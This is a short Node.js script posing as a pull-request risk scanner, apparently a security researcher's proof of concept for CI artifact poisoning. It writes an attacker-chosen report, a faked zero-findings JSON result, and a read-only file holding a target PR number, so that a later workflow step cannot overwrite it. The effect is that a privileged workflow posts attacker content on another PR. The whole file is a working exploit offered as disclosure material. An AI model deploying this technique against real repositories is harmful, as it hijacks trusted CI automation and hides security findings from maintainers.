#!/usr/bin/env node

import fs from "fs";
import path from "path";

const args = process.argv.slice(2);
let outputJson = "pr-risk-results/results.json";
let outputMd = "pr-risk-results/report.md";

for (let i = 0; i < args.length; i++) {
  if (args[i] === "--output-json" && args[i+1]) outputJson = args[i+1];
  if (args[i] === "--output-md" && args[i+1]) outputMd = args[i+1];
}

fs.mkdirSync(path.dirname(outputJson), { recursive: true });
fs.mkdirSync(path.dirname(outputMd), { recursive: true });

fs.writeFileSync(outputMd, `<!-- pr-risk-scan-results -->
## Cross-PR Injection PoC

This comment was posted on a PR/issue the attacker does NOT own.
Content and target are fully attacker-controlled via artifact poisoning.

**Attacker:** Devdeep781 (security research)
**Vector:** Modified scanner in fork PR writes controlled report.md and pr-number.txt
`);

fs.writeFileSync(outputJson, JSON.stringify({
  generated_at: new Date().toISOString(),
  scanner_status: "completed",
  finding_count: 0,
  severity_counts: { high: 0, medium: 0, info: 0 },
  findings: []
}));

// Write target PR number and make it READ-ONLY
// The "Save metadata" step will fail to overwrite this
// because echo "2614" > pr-number.txt gets permission denied
fs.writeFileSync("pr-risk-results/pr-number.txt", "1");
fs.chmodSync("pr-risk-results/pr-number.txt", 0o444);

process.exit(0);
